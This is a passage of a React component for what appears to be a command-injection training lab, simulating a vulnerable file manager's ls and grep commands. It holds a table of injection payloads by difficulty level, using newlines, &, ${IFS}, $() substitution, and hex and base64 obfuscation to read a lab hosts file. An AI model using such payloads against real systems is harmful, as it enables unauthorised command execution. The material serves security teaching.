...
// 文件关 ls：路径须在 lab 内才能通过 resolvePathUnderLab，故用 app.log 前缀使注入生效
const PAYLOAD_SUGGESTIONS = {
  1: [
    {
      kind: '换行符绕过',
      expect: '使用 %0a 换行执行第二条命令，读取 lab 内 hosts',
      value: 'app.log%0acat hosts',
    },
    {
      kind: '后台执行',
      expect: '使用 & 连接第二条命令，读取 lab 内 hosts',
      value: 'app.log& cat hosts',
    },
    {
      kind: '逻辑或',
  ...
  2: [
    {
      ...
      value: 'app.log${IFS}cat${IFS}hosts',
    },
    {
      kind: '命令替换',
      expect: '$() 执行 cat hosts 并将输出拼进命令行',
      value: 'app.log$(cat${IFS}hosts)',
    },
  ],
  3: [
    {
  ...
  4: [
    ...
    },
    {
      ...
      value: 'app.log;$(printf%09\\x63\\x61\\x74)%09hosts',
    },
  ],
  5: [
    {
      ...
      value: 'app.log;$(echo%09Y2F0IGhvc3Rz%09|%09base64%09-d)',
    },
    {
      kind: 'printf 十六进制',
...
export default function CommandExecutionFile() {
  ...
  const handleExecuteLs = async () => {
    try {
      console.log('调用 ls API:', mode, path, weakLevel);
      await run('ls', () => commandExecutionApi.ls(mode, path, weakLevel));
      ...
      console.error('ls Execution failed:', error);
  ...
  const handleExecuteGrep = async () => {
    try {
      console.log('调用 grep API:', mode, keyword, weakLevel);
      await run('grep', () => commandExecutionApi.grep(mode, keyword, weakLevel));
      ...
      console.error('grep Execution failed:', error);
      console.error('Error details:', error.response?.data || error.message);
    }
  };

  // ls 和 grep 复用一套 payload，但 grep 里部分（如 %0a / ; / ||）会导致 grep 卡住超时。
  // 这里对 grep 只保留“不会挂起、能稳定看到结果”的几条（如 &、${IFS}、$() 等）。
  const allSuggestions = PAYLOAD_SUGGESTIONS[weakLevel] || [];
  const currentSuggestions =
    activeTab === 'ls'
      ? allSuggestions
      : allSuggestions.filter((p) => {
          const v = p.value || '';
          return !v.includes('%0a') && !v.includes(';') && !v.includes('||');
        });
  ...
  return (
    <div style={{ maxWidth: 1440, width: '100%', margin: '0 auto' }}>
      <Title level={2} style={{ color: '#e6edf3', fontWeight: 600, marginBottom: 8 }}>
        <FileTextOutlined /> 文件操作 - ls/grep 命令注入
      </Title>
      <Paragraph style={{ color: '#8b9cb3', fontSize: 15, marginBottom: 18 }}>
        模拟文件管理系统的命令注入漏洞。通过 ls 和 grep 命令进行文件操作，
        ...
        <Col xs={24} lg={16} style={{ display: 'flex' }}>
          ...
          >
            <Alert
              type="info"
              showIcon
              title="文件管理系统：通过 ls 和 grep 命令进行文件操作，但存在命令注入风险。"
          ...
          >
            ...
            <div style={{ marginTop: 12 }}>
              ...
              <div style={{
                ...
                {activeTab === 'ls' ? `ls ${path}` : `grep ${keyword}`}
              </div>
            </div>
                        ...
                        children: (
                          <div style={{ color: '#c6d3e5', fontSize: 12, lineHeight: 1.8 }}>
                            ...
                            <div style={{
                              ...
                              <div style={{ marginBottom: 8 }}>{activeTab === 'ls' ? (path || '(空)') : (keyword || '(空)')}</div>
                              <div style={{ color: '#8b9cb3' }}>output：</div>
                              <div>{activeTab === 'ls' ? `ls ${path}` : `grep ${keyword}`}</div>
                            </div>
                          </div>
                        ),
                      },
                        ...
                        <Tag
                          ...
                          onClick={() => {
                            if (activeTab === 'ls') {
                              setPath(p.value);
                              reportCoachUi({
                                context: `command_execution_file_ls_${mode}_payload_click`,
                                mode: mode,
                                focus: 'payload_click',
                                input: p.value,
                                extras: { weakLevel }
                              ...
                              setKeyword(p.value);
                              reportCoachUi({
                                context: `command_execution_file_grep_${mode}_payload_click`,
                                mode: mode,
                                focus: 'payload_click',
                                input: p.value,
                                extras: { weakLevel }
